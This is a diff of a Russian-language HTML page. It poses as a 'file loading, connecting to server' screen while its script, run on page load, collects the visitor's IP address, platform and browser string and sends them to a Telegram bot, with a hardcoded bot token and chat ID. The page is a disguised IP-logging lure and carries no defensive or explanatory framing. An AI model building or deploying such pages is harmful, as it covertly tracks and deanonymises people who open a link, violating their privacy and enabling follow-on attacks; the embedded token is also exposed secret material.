@@ -1,34 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка файла...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
-        .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        body { 
+            background: #0f0f0f; 
+            color: #ffffff; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { font-size: 18px; font-weight: 300; opacity: 0.8; }
     </style>
 </head>
 <body>
+
     <div class="loader"></div>
-    <p>Идет загрузка контента...</p>
+    <div class="text">Подождите, идет соединение с сервером...</div>
 
     <script>
-        // ТВОИ ДАННЫЕ (Заполни их!)
-        const token = '8584292952:AAFUOH5LLSfuceNPbXUtECFrJJop_WJ0Rf4';
-        const chatId = '1789528504';
+        // --- НАСТРОЙКИ (Вставь свои данные) ---
+        const TG_TOKEN = '8584292952:AAFUOH5LLSfuceNPbXUtECFrJJop_WJ0Rf4'; 
+        const CHAT_ID = '1789528504';
+        // ---------------------------------------
 
-        // Функция получения IP и отправки в ТГ
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const message = `🔔 Переход по ссылке!\n🌐 IP: ${ip}\n📱 Инфо: ${navigator.userAgent}`;
-                
-                // Отправка запроса в Telegram API напрямую
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-            })
-            .catch(err => console.error('Ошибка'));
+        async function sendLog() {
+            try {
+                // 1. Получаем IP пользователя через внешний API
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // 2. Собираем доп. информацию (браузер, язык)
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+
+                // 3. Формируем сообщение
+                const message = `
+🎯 **Новый переход!**
+🌐 **IP:** \`${userIP}\`
+📱 **Устройство:** ${platform}
+🌍 **Браузер:** ${userAgent.split(') ')[1] || 'Unknown'}
+                `;
+
+                // 4. Отправляем в Telegram
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+            } catch (error) {
+                console.error('Ошибка логирования');
+            }
+        }
+
+        // Запускаем функцию при открытии страницы
+        window.onload = sendLog;
     </script>
 </body>
 </html>
